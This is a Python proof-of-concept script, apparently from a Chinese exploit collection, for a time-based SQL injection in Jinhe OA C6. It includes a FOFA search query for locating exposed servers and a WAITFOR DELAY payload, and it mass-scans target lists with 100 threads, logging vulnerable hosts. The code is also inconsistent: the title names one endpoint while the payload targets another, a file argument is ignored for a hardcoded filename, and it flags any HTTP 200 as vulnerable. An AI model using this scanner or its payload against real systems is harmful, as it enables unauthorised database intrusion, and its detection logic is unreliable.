#金和OA C6-GetSgIData.aspx SQL注入漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


# fofa语句
# app="金和网络-金和OA" && body="/c6/"

def banner():
    test ="""

 ██████╗ ██████╗        ██████╗ ███████╗████████╗███████╗ ██████╗ ██╗██████╗  █████╗ ████████╗ █████╗     █████╗ ███████╗██████╗ ██╗  ██╗        ███████╗ ██████╗ ██╗     
██╔════╝██╔════╝       ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔════╝ ██║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗   ██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝        ██╔════╝██╔═══██╗██║     
██║     ███████╗ █████╗██║  ███╗█████╗     ██║   ███████╗██║  ███╗██║██║  ██║███████║   ██║   ███████║   ███████║███████╗██████╔╝ ╚███╔╝         ███████╗██║   ██║██║     
██║     ██╔═══██╗╚════╝██║   ██║██╔══╝     ██║   ╚════██║██║   ██║██║██║  ██║██╔══██║   ██║   ██╔══██║   ██╔══██║╚════██║██╔═══╝  ██╔██╗         ╚════██║██║▄▄ ██║██║     
╚██████╗╚██████╔╝      ╚██████╔╝███████╗   ██║   ███████║╚██████╔╝██║██████╔╝██║  ██║   ██║   ██║  ██║██╗██║  ██║███████║██║     ██╔╝ ██╗███████╗███████║╚██████╔╝███████╗
 ╚═════╝ ╚═════╝        ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                                          
                                                                                                                                
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="金和OA C6-GetSgIData.aspx SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    api_payload = "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1"
    try:
        res1 = requests.post(url=target+api_payload,verify=False,timeout=10)
        if res1.status_code==200:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")   

if __name__ == "__main__":
    main()
